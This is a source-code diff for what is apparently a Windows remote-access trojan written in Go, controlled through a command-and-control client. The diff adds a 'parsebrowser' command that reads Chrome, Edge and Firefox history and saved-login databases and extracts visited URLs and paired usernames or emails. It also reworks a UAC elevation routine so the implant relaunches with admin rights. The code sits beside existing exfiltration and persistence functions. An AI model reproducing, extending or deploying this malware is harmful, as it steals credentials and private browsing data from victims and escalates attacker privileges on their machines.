@@ -20,7 +20,9 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
+	"regexp"
 	"runtime"
+	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -1289,6 +1291,176 @@ func exfilBrowserData(c2 *C2Client) string {
 }
 
 // ================================================================
+// BROWSER DATA PARSER
+// ================================================================
+
+func extractURLsFromSQLite(data []byte) []string {
+	re := regexp.MustCompile(`https?://[^\x00-\x1f\x7f-\x9f]{4,500}`)
+	matches := re.FindAll(data, -1)
+	seen := make(map[string]bool)
+	var urls []string
+	for _, m := range matches {
+		s := string(m)
+		// trim trailing junk chars common in SQLite pages
+		s = strings.TrimRight(s, "\x00 \t\r\n")
+		if idx := strings.IndexAny(s, "\x00\x01\x02\x03"); idx > 0 {
+			s = s[:idx]
+		}
+		if !seen[s] && len(s) > 10 {
+			seen[s] = true
+			urls = append(urls, s)
+		}
+	}
+	return urls
+}
+
+func extractLoginsFromSQLite(data []byte) []string {
+	// Login Data stores origin_url and username_value as plaintext in SQLite records
+	// Extract origin URLs paired with nearby text that looks like usernames
+	re := regexp.MustCompile(`https?://[^\x00-\x1f\x7f-\x9f]{4,300}`)
+	matches := re.FindAllIndex(data, -1)
+	seen := make(map[string]bool)
+	var entries []string
+
+	for _, loc := range matches {
+		url := strings.TrimRight(string(data[loc[0]:loc[1]]), "\x00 ")
+		if idx := strings.IndexAny(url, "\x00\x01\x02\x03"); idx > 0 {
+			url = url[:idx]
+		}
+		if len(url) < 10 {
+			continue
+		}
+
+		// scan forward from end of URL for a username-like string (email or text)
+		searchEnd := loc[1] + 500
+		if searchEnd > len(data) {
+			searchEnd = len(data)
+		}
+		chunk := data[loc[1]:searchEnd]
+
+		emailRe := regexp.MustCompile(`[a-zA-Z0-9._%+\-]{2,64}@[a-zA-Z0-9.\-]{2,64}\.[a-zA-Z]{2,10}`)
+		if emailMatch := emailRe.Find(chunk); emailMatch != nil {
+			key := url + "|" + string(emailMatch)
+			if !seen[key] {
+				seen[key] = true
+				entries = append(entries, fmt.Sprintf("  %s  |  %s", url, string(emailMatch)))
+			}
+		} else {
+			// look for any printable text near the URL as potential username
+			userRe := regexp.MustCompile(`[a-zA-Z0-9._%+\-]{3,40}`)
+			for _, um := range userRe.FindAll(chunk[:min(len(chunk), 200)], 5) {
+				s := string(um)
+				// skip common SQLite/Chrome internal strings
+				if strings.EqualFold(s, "CREATE") || strings.EqualFold(s, "TABLE") ||
+					strings.EqualFold(s, "INDEX") || strings.EqualFold(s, "android") ||
+					strings.EqualFold(s, "password") || strings.EqualFold(s, "username") ||
+					strings.EqualFold(s, "signon_realm") || strings.EqualFold(s, "origin_url") ||
+					strings.EqualFold(s, "action_url") || len(s) <= 3 {
+					continue
+				}
+				key := url + "|" + s
+				if !seen[key] {
+					seen[key] = true
+					entries = append(entries, fmt.Sprintf("  %s  |  %s", url, s))
+				}
+				break
+			}
+		}
+	}
+	return entries
+}
+
+func parseBrowserData() string {
+	localAppData := os.Getenv("LOCALAPPDATA")
+	appData := os.Getenv("APPDATA")
+
+	type browserInfo struct {
+		name        string
+		historyPath string
+		loginPath   string
+	}
+
+	browsers := []browserInfo{
+		{"Chrome", filepath.Join(localAppData, `Google\Chrome\User Data\Default\History`), filepath.Join(localAppData, `Google\Chrome\User Data\Default\Login Data`)},
+		{"Edge", filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\History`), filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\Login Data`)},
+	}
+
+	// Firefox
+	ffProfiles := filepath.Join(appData, `Mozilla\Firefox\Profiles`)
+	if entries, err := os.ReadDir(ffProfiles); err == nil {
+		for _, e := range entries {
+			if e.IsDir() && strings.Contains(e.Name(), ".default") {
+				profDir := filepath.Join(ffProfiles, e.Name())
+				browsers = append(browsers, browserInfo{"Firefox", filepath.Join(profDir, "places.sqlite"), filepath.Join(profDir, "logins.json")})
+				break
+			}
+		}
+	}
+
+	var sb strings.Builder
+	for _, b := range browsers {
+		sb.WriteString(fmt.Sprintf("=== %s ===\n", b.name))
+
+		// Parse history
+		if data, err := os.ReadFile(b.historyPath); err == nil {
+			urls := extractURLsFromSQLite(data)
+			if len(urls) > 100 {
+				urls = urls[:100]
+			}
+			sb.WriteString(fmt.Sprintf("\n[History - %d URLs]\n", len(urls)))
+			sort.Strings(urls)
+			for _, u := range urls {
+				sb.WriteString("  " + u + "\n")
+			}
+		} else {
+			sb.WriteString("\n[History] Not found\n")
+		}
+
+		// Parse logins
+		if b.name == "Firefox" {
+			// Firefox stores logins in JSON
+			if data, err := os.ReadFile(b.loginPath); err == nil {
+				sb.WriteString(fmt.Sprintf("\n[Saved Logins - raw JSON %d bytes]\n", len(data)))
+				// Extract hostname and username fields from JSON
+				type ffLogin struct {
+					Hostname          string `json:"hostname"`
+					EncryptedUsername string `json:"encryptedUsername"`
+				}
+				type ffLogins struct {
+					Logins []ffLogin `json:"logins"`
+				}
+				var logins ffLogins
+				if json.Unmarshal(data, &logins) == nil {
+					for _, l := range logins.Logins {
+						sb.WriteString(fmt.Sprintf("  %s  |  (encrypted)\n", l.Hostname))
+					}
+				}
+			} else {
+				sb.WriteString("\n[Saved Logins] Not found\n")
+			}
+		} else {
+			// Chromium - Login Data is SQLite, extract URL/username pairs
+			if data, err := os.ReadFile(b.loginPath); err == nil {
+				entries := extractLoginsFromSQLite(data)
+				sb.WriteString(fmt.Sprintf("\n[Saved Logins - %d entries]\n", len(entries)))
+				for _, e := range entries {
+					sb.WriteString(e + "\n")
+				}
+			} else {
+				sb.WriteString("\n[Saved Logins] Not found\n")
+			}
+		}
+		sb.WriteString("\n")
+	}
+
+	result := sb.String()
+	if len(result) == 0 {
+		return "No browser data found"
+	}
+	return result
+}
+
+// ================================================================
 // FILE EXFILTRATION
 // ================================================================
 
@@ -1489,11 +1661,20 @@ func removePersistence() string {
 // ================================================================
 
 func elevate() string {
-	exePath, _ := os.Executable()
+	if isAdmin() {
+		return "Already running as admin — no elevation needed"
+	}
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Sprintf("Failed to get executable path: %v", err)
+	}
 	verb, _ := windows.UTF16PtrFromString("runas")
 	exe, _ := windows.UTF16PtrFromString(exePath)
-	pShellExecuteW.Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(exe)), 0, 0, 1)
-	return "UAC elevation attempted"
+	ret, _, _ := pShellExecuteW.Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(exe)), 0, 0, 1)
+	if ret > 32 {
+		return "UAC elevation successful — new elevated session will connect shortly"
+	}
+	return fmt.Sprintf("UAC elevation failed (code %d) — user may have denied the prompt", ret)
 }
 
 // ================================================================
@@ -1789,6 +1970,7 @@ SYSTEM
 EXFILTRATION
   exfiltrate     - Exfil files (args: path, extensions, max_size)
   browserdb      - Exfil browser databases (Chrome, Edge, Firefox)
+  parsebrowser   - Parse browser history & saved logins locally
   upload         - Upload file to client (args: path, data)
   download       - Download file from client (args: path)
   foldertree     - Show folder trees for Desktop/Docs/Downloads
@@ -1929,6 +2111,9 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 
 	case "browserdb":
 		result = exfilBrowserData(c2)
+
+	case "parsebrowser":
+		result = parseBrowserData()
 
 	case "upload":
 		var args struct {
